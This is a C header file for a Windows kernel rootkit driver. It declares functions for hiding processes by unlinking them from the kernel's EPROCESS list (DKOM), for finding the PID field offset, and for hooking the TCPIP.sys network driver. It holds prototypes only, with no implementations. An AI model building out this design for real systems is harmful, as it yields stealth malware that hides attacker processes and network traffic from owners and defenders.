#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <ntddk.h>
#include <winapifamily.h> 



//------------------------------------------------------------------------------
//						Main Driver Functionality (driver.c)
//------------------------------------------------------------------------------

// Driver unload function
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

//------------------------------------------------------------------------------
//						IRP Handlers (irphandlers.c)
//------------------------------------------------------------------------------

// Default IRP dispatcher
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

// IRP that calls our rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

//------------------------------------------------------------------------------
//						DKOM Functionality (hideprocess.c)
//------------------------------------------------------------------------------

// Search for the process to modify
void modifyTaskList(UINT32 pid);


// De-link the process from the EPROCESS list
void remove_links(PLIST_ENTRY Current);

//------------------------------------------------------------------------------
//						Offset Discovery (discoveroffset.c)
//------------------------------------------------------------------------------

// Return the offset of the PID field in the EPROCESS list
ULONG find_eprocess_pid_offset();

//------------------------------------------------------------------------------
//								TCP/IP Hook
//------------------------------------------------------------------------------

// Hook the TCPIP.sys driver
NTSTATUS TCPHook();


// Hook handler for hooked TCP/IP driver
//NTSTATUS TCPIRPHookHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);


// Completion routine
NTSTATUS HookCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp, _In_ PVOID Context);

// Removal function, for driver unload
NTSTATUS RemoveTCPHook(IN PDRIVER_OBJECT DriverObject);
